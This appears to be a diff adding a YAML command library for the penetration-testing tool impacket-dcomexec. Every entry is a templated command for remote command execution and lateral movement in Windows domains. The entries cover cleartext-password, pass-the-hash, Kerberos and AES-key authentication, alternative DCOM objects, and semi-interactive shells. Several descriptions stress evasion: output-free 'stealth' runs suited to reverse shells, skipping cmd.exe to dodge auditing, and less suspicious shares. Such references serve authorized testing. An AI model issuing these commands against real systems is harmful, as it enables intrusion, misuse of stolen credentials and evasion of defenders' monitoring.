@@ -1,0 +1,84 @@
+tool: impacket-dcomexec
+tags: [pentest, lateral-movement, security, windows, active-directory, impacket, exploitation]
+
+actions:
+  # === AUTHENTICATION METHODS ===
+  - title: impacket-dcomexec - basic password authentication
+    desc: |
+      Executes a command on a remote host using a cleartext password. 
+      This is the most straightforward method for lateral movement when valid credentials are available. 
+      It defaults to the ShellWindows DCOM object to execute the specified command.
+    command: "impacket-dcomexec {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command|whoami}}'"
+
+  - title: impacket-dcomexec - pass-the-hash
+    desc: |
+      Performs remote command execution using NTLM hashes instead of a plaintext password. 
+      The hash must be provided in the LMHASH:NTHASH format; if the LM hash is unknown, use 32 zeros. 
+      This method is vital for moving laterally after extracting hashes from memory or the SAM database without cracking them.
+    command: "impacket-dcomexec -hashes {{lm_hash|00000000000000000000000000000000}}:{{nt_hash}} {{domain|.}}/{{username}}@{{target_ip}} '{{command|hostname}}'"
+
+  - title: impacket-dcomexec - kerberos authentication
+    desc: |
+      Uses Kerberos tickets for authentication instead of NTLM, which is useful in environments where NTLM is disabled. 
+      You must provide the -k flag and ensure you have a valid Kerberos ticket in your cache (KRB5CCNAME). 
+      Specifying the -dc-ip is often required to resolve the Domain Controller's address correctly during the ticket validation process.
+    command: "impacket-dcomexec -k -no-pass -dc-ip {{dc_ip}} {{domain}}/{{username}}@{{target_hostname}} '{{command}}'"
+
+  # === DCOM OBJECT SELECTION ===
+  - title: impacket-dcomexec - use MMC20.Application object
+    desc: |
+      Leverages the MMC20.Application DCOM object to execute commands on the target. 
+      Different DCOM objects can be used to bypass specific security controls or detection patterns that might monitor only the default object. 
+      The MMC20 object is a common alternative that provides similar execution capabilities as ShellWindows.
+    command: "impacket-dcomexec -object MMC20 {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command}}'"
+
+  - title: impacket-dcomexec - use ShellBrowserWindow object
+    desc: |
+      Utilizes the ShellBrowserWindow DCOM object for command execution. 
+      This is one of the three supported objects in the tool and might be useful if other objects are restricted by policy. 
+      It essentially provides another path for lateral movement through the DCOM interface.
+    command: "impacket-dcomexec -object ShellBrowserWindow {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command}}'"
+
+  # === EXECUTION MODES ===
+  - title: impacket-dcomexec - semi-interactive shell
+    desc: |
+      Launches a semi-interactive shell on the remote target by omitting the command argument. 
+      This allows the user to run multiple commands sequentially without re-authenticating for every single action. 
+      The tool manages the output by reading it from a temporary file on the ADMIN$ share by default.
+    command: "impacket-dcomexec {{domain|.}}/{{username}}:{{password}}@{{target_ip}}"
+
+  - title: impacket-dcomexec - stealth mode (no output)
+    desc: |
+      Executes the command without establishing an SMB connection to retrieve the output. 
+      This is significantly more stealthy because it avoids creating files on the ADMIN$ share and reduces network traffic. 
+      It is ideal for executing reverse shells or "fire-and-forget" scripts where you do not need to see the command's stdout.
+    command: "impacket-dcomexec -nooutput {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command}}'"
+
+  - title: impacket-dcomexec - silent command execution
+    desc: |
+      Executes the command directly without invoking 'cmd.exe /c'. 
+      This can help in bypassing simple command-line auditing or detection rules that look for cmd.exe execution patterns. 
+      Note that when using this flag, you cannot use built-in shell commands like 'dir' or 'cd' directly.
+    command: "impacket-dcomexec -silentcommand {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command}}'"
+
+  # === ADVANCED CONFIGURATION ===
+  - title: impacket-dcomexec - use powershell as shell type
+    desc: |
+      Forces the semi-interactive shell to use PowerShell as the command processor instead of the default cmd.exe. 
+      This is beneficial when the intended post-exploitation tasks require PowerShell's advanced scripting capabilities. 
+      Be aware that this may trigger AMSI or PowerShell Script Block Logging on modern Windows systems.
+    command: "impacket-dcomexec -shell-type powershell {{domain|.}}/{{username}}:{{password}}@{{target_ip}}"
+
+  - title: impacket-dcomexec - custom output share
+    desc: |
+      Specifies a custom SMB share for retrieving command output instead of the default ADMIN$. 
+      This can be useful if the ADMIN$ share is restricted or if you want to use a less suspicious share name. 
+      The user must have write permissions to the specified share for output retrieval to function.
+    command: "impacket-dcomexec -share {{share_name|C$}} {{domain|.}}/{{username}}:{{password}}@{{target_ip}} '{{command}}'"
+
+  - title: impacket-dcomexec - kerberos with AES key
+    desc: |
+      Authenticates using Kerberos by providing the AES hex key (128 or 256 bits). 
+      This is useful in advanced scenarios where the AES key is known but the password or NTLM hash is not available. 
+      It provides a robust way to authenticate against modern Active Directory environments.
+    command: "impacket-dcomexec -aesKey {{aes_key}} -k -no-pass {{domain}}/{{username}}@{{target_hostname}}"
